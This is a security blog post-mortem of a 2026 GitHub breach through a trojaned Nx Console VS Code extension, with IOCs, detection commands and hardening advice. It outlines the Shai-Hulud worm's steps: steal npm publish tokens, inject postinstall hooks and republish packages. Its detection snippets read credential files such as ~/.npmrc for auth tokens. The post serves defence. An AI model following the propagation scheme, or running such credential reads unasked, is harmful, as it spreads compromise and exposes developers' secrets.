+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+
+<hr>
+
+<h2>
+  <a name="the-github-breach-postmortem" href="#the-github-breach-postmortem">
+  </a>
+  The GitHub Breach: Post-Mortem
+</h2>
+
+<h3>
+  <a name="what-got-taken" href="#what-got-taken">
+  </a>
+  What Got Taken
+</h3>
+
+<div class="table-wrapper-paragraph"><table>
+<thead>
+<tr>
+<th>Item</th>
+<th>Detail</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Internal repositories</td>
+<td>~3,800 confirmed (GitHub's assessment: "directionally consistent" with attacker claims)</td>
+</tr>
+<tr>
+<td>Type</td>
+<td>GitHub's own internal corporate codebase</td>
+</tr>
+<tr>
+<td>Customer repos</td>
+<td>No evidence of impact</td>
+</tr>
+<tr>
+<td>User data</td>
+<td>No evidence of impact</td>
+</tr>
+<tr>
+<td>Price on BreachForums</td>
+<td>&gt; $50,000</td>
+</tr>
+</tbody>
+</table></div>
+
+<h3>
+  <a name="what-github-did-right" href="#what-github-did-right">
+  </a>
+  What GitHub Did Right
+</h3>
+
+
+
+<div class="highlight js-code-highlight">
+<pre class="highlight plaintext"><code>May 19, 2026 — Detection (same day as infection)
+├── Isolated the compromised endpoint
+├── Removed malicious extension version from Marketplace
+├── Began rotating high-impact credentials and cryptographic keys
+└── Opened internal incident response investigation
+
+May 20, 2026 — Public disclosure (next day)
+├── Statement on X with technical summary
+├── Investigation ongoing
+└── Committed to publishing detailed post-mortem
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+<p>Detection-to-public-disclosure in <strong>under 24 hours</strong> is actually good. The problem was the infection happening at all.</p>
+
+<h3>
+  <a name="what-github-did-wrong-structurally" href="#what-github-did-wrong-structurally">
+  </a>
+  What GitHub Did Wrong (Structurally)
+</h3>
+
+<ol>
+<li><p><strong>An employee ran an auto-updated VS Code extension on a device with access to 3,800 internal repos.</strong> The blast radius of a single developer endpoint should never be that large.</p></li>
+<li><p><strong>No apparent extension allowlisting.</strong> The malicious version was on the Marketplace for 18 minutes. With allowlisting + minimum-age policies, this installs nothing.</p></li>
+<li><p><strong>GitHub still hasn't formally named the extension.</strong> This is a transparency problem. The security community identified Nx Console v18.95.0 through independent analysis. Official confirmation matters for incident response across the 2.2M install base.</p></li>
+</ol>
+
+
+<hr>
+
+<h2>
+  <a name="the-shaihulud-worm-technical-deep-dive" href="#the-shaihulud-worm-technical-deep-dive">
+  </a>
+  The Shai-Hulud Worm: Technical Deep Dive
+</h2>
+
+<p>The worm that powered much of this campaign deserves its own section.</p>
+
+<p><strong>Original Shai-Hulud (Sep 2025) — Core Mechanism:</strong><br>
+</p>
+
+<div class="highlight js-code-highlight">
+<pre class="highlight plaintext"><code>1. Steal npm publish token from compromised environment
+2. Enumerate every package that token can reach
+3. Inject malicious postinstall hook into each package
+4. Re-publish all of them
+5. Any developer who installs any of those packages → infected
+6. Their tokens stolen → their packages infected
+7. Repeat
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+<p>This is exponential propagation. One stolen token = potentially thousands of downstream packages.</p>
+
+<p><strong>Mini Shai-Hulud evolution (2026):</strong><br>
+</p>
+
+<div class="highlight js-code-highlight">
+<pre class="highlight plaintext"><code>Added in Nov/Dec 2025:
+└── Data-wiping functionality (destructive payload option)
+
+Added in April 2026:
+└── No stolen credential needed (GitHub Actions cache poisoning)
+└── Cross-registry simultaneous strike (npm + PyPI + RubyGems same 48h window)
+
+Added in May 2026:
+└── VS Code extension vector
+└── IDE plugin ecosystem targeting
+└── Source code open-sourced (MIT license on GitHub)
+└── $1,000 Monero "supply chain contest" on BreachForums → copycat actors
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+<p><strong>The open-sourcing move is a threat multiplier.</strong> TeamPCP turned their campaign tool into a platform. Within days of the source code drop, OX Security documented the first copycat campaign from a new actor publishing 4 malicious npm packages using the Shai-Hulud codebase.</p>
+
+
+<hr>
+
+<h2>
+  <a name="iocs-and-detection-signals" href="#iocs-and-detection-signals">
+  </a>
+  IOCs and Detection Signals
+</h2>
+
+<h3>
+  <a name="packagelevel-iocs" href="#packagelevel-iocs">
+  </a>
+  Package-Level IOCs
+</h3>
+
+
+
+<div class="highlight js-code-highlight">
+<pre class="highlight yaml"><code><span class="na">Known malicious versions (rotate credentials if you used these)</span><span class="pi">:</span>
+<span class="s">├── npm</span>
+<span class="s">│   ├── axios 1.14.1, 0.30.0 (March 31, 2026)</span>
+<span class="s">│   ├── @bitwarden/cli 2026.4.0</span>
+<span class="s">│   ├── @tanstack/react-router [malicious versions, May 11]</span>
+<span class="s">│   ├── @tanstack/* (42 packages, May 11, 19:20-19:26 UTC)</span>
+<span class="s">│   ├── @mistralai/* (May 12 — payload non-functional)</span>
+<span class="s">│   └── @uipath/* (May 12 — payload non-functional)</span>
+<span class="s">├── PyPI</span>
+<span class="s">│   ├── litellm [March 2026 malicious versions]</span>
+<span class="s">│   ├── telnyx 4.87.2</span>
+<span class="s">│   └── microsoft-durabletask-worker [May 19, 3 versions]</span>
+<span class="s">├── VS Code Marketplace</span>
+<span class="s">│   └── nrwl.angular-console 18.95.0 (May 18, 12:30-12:48 UTC)</span>
+<span class="s">└── GitHub Actions</span>
+    <span class="s">└── aquasecurity/trivy-action [76/77 tags, March 2026]</span>
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+<h3>
+  <a name="behavioral-iocs" href="#behavioral-iocs">
+  </a>
+  Behavioral IOCs
+</h3>
+
+
+
+<div class="highlight js-code-highlight">
+<pre class="highlight shell"><code><span class="c"># Signs of active Shai-Hulud/TeamPCP infection:</span>
+
+<span class="c"># 1. Unexpected .pth files in site-packages</span>
+find /usr/lib/python<span class="k">*</span> /usr/local/lib/python<span class="k">*</span> ~/.local/lib/python<span class="k">*</span> <span class="se">\</span>
+  <span class="nt">-name</span> <span class="s2">"*.pth"</span> <span class="nt">-newer</span> /var/log/dpkg.log 2&gt;/dev/null
+
+<span class="c"># 2. Unusual outbound connections during npm install</span>
+<span class="c"># Look for curl/node spawned by VS Code extension process</span>
+
+<span class="c"># 3. Orphan commits being fetched</span>
+git fsck <span class="nt">--lost-found</span> 2&gt;&amp;1 | <span class="nb">grep</span> <span class="s2">"dangling commit"</span>
+
+<span class="c"># 4. npm token in environment or .npmrc after extension install</span>
+<span class="nb">grep</span> <span class="nt">-r</span> <span class="s2">"_authToken"</span> ~/.npmrc ~/.config/npm/ 2&gt;/dev/null
+
+<span class="c"># 5. Payload skip signal (Russian locale check in payload)</span>
+<span class="c"># If your env has LANG=ru_RU — payload was designed to skip you</span>
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+<h3>
+  <a name="attribution-fingerprints-technical" href="#attribution-fingerprints-technical">
+  </a>
+  Attribution Fingerprints (Technical)
+</h3>
+
+
+
+<div class="highlight js-code-highlight">
+<pre class="highlight plaintext"><code>High confidence (Wiz):
+└── Shared RSA public key across Trivy, Telnyx, Nx Console payloads
+
+Medium confidence (Socket, StepSecurity):
+├── Shared cipher salt across malware families
+└── Dead-drop string lineage (identical URL patterns for orphan commit hosting)
+
+Low confidence:
+└── Behavioral overlap with Eastern European cybercrime TTPs
+└── Russian locale skip (standard crew protection measure)
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+
+<hr>
+
+<h2>
+  <a name="the-nx-console-exposure-window-are-you-affected" href="#the-nx-console-exposure-window-are-you-affected">
+  </a>
+  The Nx Console Exposure Window: Are YOU Affected?
+</h2>
+
+<p>If you have VS Code with auto-update enabled and Nx Console installed, you need to check.<br>
+</p>
+
+<div class="highlight js-code-highlight">
+<pre class="highlight plaintext"><code>Exposure window: May 18, 2026
+Time (UTC):      12:30 — 12:48 (VS Code Marketplace)
+                 12:30 — 13:06 (OpenVSX)
+
+Check your VS Code extension history:
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+
+
+<div class="highlight js-code-highlight">
+<pre class="highlight shell"><code><span class="c"># Check VS Code extension install/update logs</span>
+<span class="c"># Linux/macOS:</span>
+<span class="nb">cat</span> ~/.vscode/extensions/nrwl.angular-console-<span class="k">*</span>/package.json | <span class="nb">grep</span> <span class="s1">'"version"'</span>
+
+<span class="c"># If you see 18.95.0 — assume full compromise</span>
+<span class="c"># Rotate immediately:</span>
+<span class="c"># 1. GitHub PATs</span>
+<span class="c"># 2. npm auth tokens  </span>
+<span class="c"># 3. AWS credentials</span>
+<span class="c"># 4. 1Password vault (change master password, regenerate secrets)</span>
+<span class="c"># 5. Anthropic API keys (if you use Claude Code)</span>
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+
+<hr>
+
+<h2>
+  <a name="what-every-developer-should-do-now" href="#what-every-developer-should-do-now">
+  </a>
+  What Every Developer Should Do Now
+</h2>
+
+<h3>
+  <a name="immediate-actions" href="#immediate-actions">
+  </a>
+  Immediate Actions
+</h3>
+
+
+
+<div class="highlight js-code-highlight">
+<pre class="highlight shell"><code><span class="c"># 1. Audit GitHub Actions workflows for dangerous permission combos</span>
+<span class="c"># Find workflows triggered by pull_request with write permissions:</span>
+<span class="nb">grep</span> <span class="nt">-r</span> <span class="s2">"pull_request"</span> .github/workflows/ | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"pull_request_target"</span>
+<span class="c"># Then check if any job has: actions: write OR contents: write</span>
+
+<span class="c"># 2. Set minimum token permissions in all workflows</span>
+<span class="c"># Add this to every workflow job:</span>
+permissions:
+  contents: <span class="nb">read
+  </span>actions: <span class="nb">read</span>
+
+<span class="c"># 3. Pin ALL GitHub Actions to full commit SHA (not tags)</span>
+<span class="c"># BAD:</span>
+uses: actions/checkout@v4
+<span class="c"># GOOD:</span>
+uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
+
+<span class="c"># 4. Audit .pth files in Python environments</span>
+find <span class="si">$(</span>python3 <span class="nt">-c</span> <span class="s2">"import site; print(' '.join(site.getsitepackages()))"</span><span class="si">)</span> <span class="se">\</span>
+  <span class="nt">-name</span> <span class="s2">"*.pth"</span> | xargs <span class="nb">cat</span>
+
+<span class="c"># 5. Rotate npm tokens if ANY package in your chain was affected</span>
+npm token revoke <span class="o">[</span>old-token]
+npm token create <span class="nt">--read-only</span>  <span class="c"># or with specific package scope</span>
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+<h3>
+  <a name="structural-hardening" href="#structural-hardening">
+  </a>
+  Structural Hardening
+</h3>
+
+
+
+<div class="highlight js-code-highlight">
+<pre class="highlight yaml"><code><span class="c1"># GitHub Actions: Restrict cache write permissions</span>
+<span class="c1"># Dangerous pattern — fork PRs can write cache:</span>
+<span class="na">on</span><span class="pi">:</span>
+  <span class="na">pull_request</span><span class="pi">:</span>
+<span class="na">jobs</span><span class="pi">:</span>
+  <span class="na">build</span><span class="pi">:</span>
+    <span class="na">runs-on</span><span class="pi">:</span> <span class="s">ubuntu-latest</span>
+    <span class="c1"># Missing explicit permissions = inherits GITHUB_TOKEN defaults (too broad)</span>
+
+<span class="c1"># Safe pattern:</span>
+<span class="na">on</span><span class="pi">:</span>
+  <span class="na">pull_request</span><span class="pi">:</span>
+<span class="na">jobs</span><span class="pi">:</span>
+  <span class="na">build</span><span class="pi">:</span>
+    <span class="na">runs-on</span><span class="pi">:</span> <span class="s">ubuntu-latest</span>
+    <span class="na">permissions</span><span class="pi">:</span>
+      <span class="na">contents</span><span class="pi">:</span> <span class="s">read</span>        <span class="c1"># read source only</span>
+      <span class="na">pull-requests</span><span class="pi">:</span> <span class="s">read</span>   <span class="c1"># read PR metadata</span>
+      <span class="c1"># NO actions: write</span>
+      <span class="c1"># NO packages: write</span>
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+
+
+<div class="highlight js-code-highlight">
+<pre class="highlight shell"><code><span class="c"># VS Code: Disable auto-update for extensions</span>
+<span class="c"># Settings → Extensions → Auto Update = false</span>
+<span class="c"># Or in settings.json:</span>
+<span class="s2">"extensions.autoUpdate"</span>: <span class="nb">false</span>
+
+<span class="c"># Consider extension allowlisting via policy</span>
+<span class="c"># For orgs: use VS Code for the Web or GitHub Codespaces </span>
+<span class="c"># where extensions run in isolated containers</span>
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+<h3>
+  <a name="detection-at-the-npm-level" href="#detection-at-the-npm-level">
+  </a>
+  Detection at the npm Level
+</h3>
+
+
+
+<div class="highlight js-code-highlight">
+<pre class="highlight shell"><code><span class="c"># Before installing any package, check:</span>
+<span class="c"># 1. When was this version published?</span>
+npm view <span class="o">[</span>package]@[version] <span class="nb">time</span> <span class="nt">--json</span>
+
+<span class="c"># 2. Does the publish timestamp match a release commit?</span>
+<span class="c"># Compare npm publish time vs GitHub release time</span>
+<span class="c"># Discrepancy = potential supply chain tampering</span>
+
+<span class="c"># 3. Verify package integrity</span>
+npm audit <span class="nt">--audit-level</span><span class="o">=</span>critical
+npm pack <span class="o">[</span>package] <span class="o">&amp;&amp;</span> <span class="nb">tar</span> <span class="nt">-tzf</span> <span class="o">[</span>package]-[version].tgz | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s2">"</span><span class="se">\.</span><span class="s2">sh</span><span class="nv">$|</span><span class="s2">postinstall"</span>
+
+<span class="c"># 4. Check for unexpected postinstall scripts</span>
+npm view <span class="o">[</span>package] scripts <span class="nt">--json</span> | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s2">"postinstall|preinstall|install"</span>
+</code></pre>
+<div class="highlight__panel js-actions-panel">
+<div class="highlight__panel-action js-fullscreen-code-action">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title>
+    <path d="M16 3h6v6h-2V5h-4V3zM2 3h6v2H4v4H2V3zm18 16v-4h2v6h-6v-2h4zM4 19h4v2H2v-6h2v4z"></path>
+</svg>
+
+    <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewbox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title>
+    <path d="M18 7h4v2h-6V3h2v4zM8 9H2V7h4V3h2v6zm10 8v4h-2v-6h6v2h-4zM8 15v6H6v-4H2v-2h6z"></path>
+</svg>
+
+</div>
+</div>
+</div>
+
+
+
+
+<hr>
+
+<h2>
+  <a name="the-bigger-picture-2026-as-the-year-of-the-developer-supply-chain" href="#the-bigger-picture-2026-as-the-year-of-the-developer-supply-chain">
+  </a>
+  The Bigger Picture: 2026 as the Year of the Developer Supply Chain
+</h2>
+
+<p>TeamPCP's campaign doesn't exist in a vacuum. They are the sharpest expression of a broader trend that's been building since 2020.</p>
+
+<div class="table-wrapper-paragraph"><table>
+<thead>
+<tr>
+<th>Attack Vector</th>
+<th>2020-2023</th>
+<th>2024-2026</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Initial access</td>
+<td>Network perimeter, RDP</td>
+<td>Developer laptop, CI/CD</td>
+</tr>
+<tr>
+<td>Primary target</td>
+<td>Production servers</td>
+<td>Developer tooling</td>
+</tr>
+<tr>
+<td>Credential source</td>
+<td>User phishing</td>
+<td>Automated env harvesting</td>
+</tr>
+<tr>
+<td>C2 infrastructure</td>
+<td>Traditional domains</td>
+<td>Decentralized (ICP, IPFS)</td>
+</tr>
+<tr>
+<td>Persistence</td>
+<td>Cron jobs, systemd</td>
+<td>Python .pth, VS Code extensions</td>
+</tr>
+<tr>
+<td>Propagation</td>
+<td>None / manual</td>
+<td>Self-replicating via publish tokens</td>
+</tr>
+</tbody>
+</table></div>
+
+<p>The threat model has inverted. Your datacenter might be hardened. Your developer laptop running VS Code with 40 extensions and auto-update enabled is the attack surface that matters.</p>
+
+<p>Five Eyes — CISA, NSA, ASD ACSC, CCCS, NCSC-UK, NCSC-NZ — published joint guidance titled <strong>"Careful Adoption of Agentic AI Services"</strong> on May 1, 2026, covering supply-chain risk for agentic tooling. The timing is not a coincidence.</p>
+
+
+<hr>
+
+<h2>
+  <a name="why-architecture-beats-prompts-and-beats-patches-too" href="#why-architecture-beats-prompts-and-beats-patches-too">
+  </a>
+  Why Architecture Beats Prompts (And Beats Patches Too)
+</h2>
+
+<p>The 18 minutes Nx Console was live. The 6 minutes TanStack was being poisoned across 42 packages. The 3 hours axios was distributing a RAT.</p>
+
+<p>Detection is reactive. Patching is reactive. Architecture is proactive.</p>
+
+<p>The developers who weren't hit by these campaigns weren't necessarily smarter or faster. They had:</p>
+
+<ul>
+<li>Explicit npm token scoping (publish only to specific packages)</li>
+<li>Extension allowlisting that blocked unapproved versions</li>
+<li>GitHub Actions with least-privilege permissions from the start</li>
+<li>Developer environments isolated from production credential access</li>
+<li>Minimum-age policies on package installs (block anything published &lt; 48h ago)</li>
+</ul>
+
+<p>The perimeter isn't your datacenter. It's your <code>~/.npmrc</code>.</p>
+
+
+<hr>
+
+<h2>
+  <a name="resources-and-references" href="#resources-and-references">
+  </a>
+  Resources and References
+</h2>
+
+<ul>
+<li><a href="https://www.ox.security/blog/teampcp-strikes-again-how-a-trojan-vs-code-extension-brought-down-github/" target="_blank" rel="noopener noreferrer">OX Security: TeamPCP Strikes Again — Nx Console Technical Analysis</a></li>
+<li><a href="https://www.ox.security/blog/teampcps-telnyx-windows-malware-technical-analysis/" target="_blank" rel="noopener noreferrer">OX Security: TeamPCP's Telnyx Windows Malware Deep Analysis</a></li>
+<li><a href="https://www.wiz.io/blog/mini-shai-hulud-strikes-again-tanstack-more-npm-packages-compromised" target="_blank" rel="noopener noreferrer">Wiz: Mini Shai-Hulud — TanStack Compromise</a></li>
+<li><a href="https://www.stepsecurity.io/blog/nx-console-vs-code-extension-compromised" target="_blank" rel="noopener noreferrer">StepSecurity: Nx Console Compromise Analysis</a></li>
+<li><a href="https://www.stepsecurity.io/blog/mini-shai-hulud-is-back-a-self-spreading-supply-chain-attack-hits-the-npm-ecosystem" target="_blank" rel="noopener noreferrer">StepSecurity: Mini Shai-Hulud Self-Spreading Analysis</a></li>
+<li><a href="https://www.akamai.com/blog/security-research/mini-shai-hulud-worm-returns-goes-public" target="_blank" rel="noopener noreferrer">Akamai: Mini Shai-Hulud Returns and Goes Public</a></li>
+<li><a href="https://phoenix.security/sha1-hulud-shai-hulud-worm-analysis-persistence-iocs/" target="_blank" rel="noopener noreferrer">Phoenix Security: Sha1-Hulud Full Technical Dissection</a></li>
+<li><a href="https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/" target="_blank" rel="noopener noreferrer">Palo Alto Unit 42: npm Threat Landscape (Updated May 2026)</a></li>
+<li><a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" target="_blank" rel="noopener noreferrer">CISA KEV: CVE-2026-33634</a></li>
+<li><a href="https://github.com/advisories" target="_blank" rel="noopener noreferrer">GitHub Security Advisory: Nx Console</a></li>
+<li><a href="https://hackread.com/github-breach-teampcp-repositories-vs-code-extension/" target="_blank" rel="noopener noreferrer">Hackread: GitHub Breach — TeamPCP Confirmation</a></li>
+<li><a href="https://www.sophos.com/en-us/blog/github-internal-repositories-breached" target="_blank" rel="noopener noreferrer">Sophos: GitHub Internal Repositories Breached</a></li>
+</ul>
+
+
+<hr>
+
+<p><em>Security research compiled from public disclosures, vendor advisories, and independent analysis published through May 20, 2026. Attribution assessments follow Wiz (high confidence), Socket and StepSecurity (medium confidence) published frameworks. IOCs may evolve — treat this as a snapshot, not a definitive indicator list.</em></p>
+
+
+<hr>
+
+<p><strong>If this helped you understand what actually happened — share it.</strong> Your colleagues who haven't rotated their npm tokens yet need to read this.</p>
+
+
+  </article>
+  <div class="post-origin">
+    Originally published on <a href="https://dev.to/freerave/teampcp-broke-github-and-nobody-saw-it-coming-but-they-should-have-3opg" target="_blank" rel="noopener noreferrer">dev.to</a>
+    · ❤ 1 · 💬 0
+    · <a href="https://dev.to/freerave/teampcp-broke-github-and-nobody-saw-it-coming-but-they-should-have-3opg#comments" target="_blank" rel="noopener noreferrer">Join the discussion →</a>
+  </div>
+</main>
+<footer class="blog-foot"><a href="/">freerave.dev</a> · <a href="https://dev.to/freerave" target="_blank" rel="noopener noreferrer">dev.to/@freerave</a></footer>
+</body>
+</html>
